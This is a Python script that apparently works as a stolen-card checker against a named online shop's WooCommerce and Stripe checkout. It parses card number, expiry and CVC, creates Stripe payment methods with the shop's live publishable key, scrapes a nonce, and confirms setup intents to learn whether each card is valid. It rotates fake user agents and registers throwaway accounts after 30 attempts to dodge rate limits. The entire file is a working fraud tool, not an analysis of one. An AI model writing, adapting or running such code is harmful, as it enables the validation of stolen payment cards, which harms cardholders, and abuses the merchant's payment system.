import requests
import random
import string
from fake_useragent import UserAgent

REGISTER_URL = "https://brandstored.com/my-account/"
PAYMENT_URL = "https://brandstored.com/my-account/add-payment-method/"
PAYMENT_LIMIT = 30
payment_count = 0

def generate_random_email():
    random_string = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    return f"{random_string}@gmail.com"

def register_new_account():
    session = requests.Session()
    user_agent = UserAgent().random
    headers = {"User-Agent": user_agent, "Referer": REGISTER_URL}

    email = generate_random_email()
    data = {"email": email}

    try:
        response = session.post(REGISTER_URL, headers=headers, data=data)
        return session
    except Exception as e:
        print(f"Error during registration: {e}")
        return None

def Tele(ccx):
    global payment_count

    session = requests.Session()

    if payment_count >= PAYMENT_LIMIT:
        session = register_new_account()
        payment_count = 0

    ccx = ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]

    if "20" in yy:
        yy = yy.split("20")[1]

    user_agent = UserAgent().random
    headers = {
        "User-Agent": user_agent,
        "Referer": PAYMENT_URL
    }

    data = {
        "type": "card",
        "card[number]": n,
        "card[cvc]": cvc,
        "card[exp_year]": yy,
        "card[exp_month]": mm,
        "key": "pk_live_51K0iXZB2XYOtRR9wlAUHbIfEr8KOW8WGGOswGDSIXiciamZdMWGxcyYlWC0owMXuAzm0nOGlJRz7Wi7e5W221M2o00IrcVCTdr",
        "_stripe_version": "2024-06-20"
    }

    response = session.post("https://api.stripe.com/v1/payment_methods", data=data, headers=headers)

    try:
        stripe_id = response.json()["id"]
    except KeyError:
        return {"error": "Failed to retrieve Stripe ID.", "response": response.json()}

    response_nonce = session.get(PAYMENT_URL, headers=headers)
    try:
        nonce = response_nonce.text.split(',"createAndConfirmSetupIntentNonce":"')[1].split('"')[0]
    except IndexError:
        return {"error": "Failed to extract nonce.", "response": response_nonce.text}

    data = {
        "action": "create_and_confirm_setup_intent",
        "wc-stripe-payment-method": stripe_id,
        "wc-stripe-payment-type": "card",
        "_ajax_nonce": nonce,
    }

    response_final = session.post(
        "https://brandstored.com/?wc-ajax=wc_stripe_create_and_confirm_setup_intent",
        headers=headers, data=data
    )

    payment_count += 1

    return response_final.json()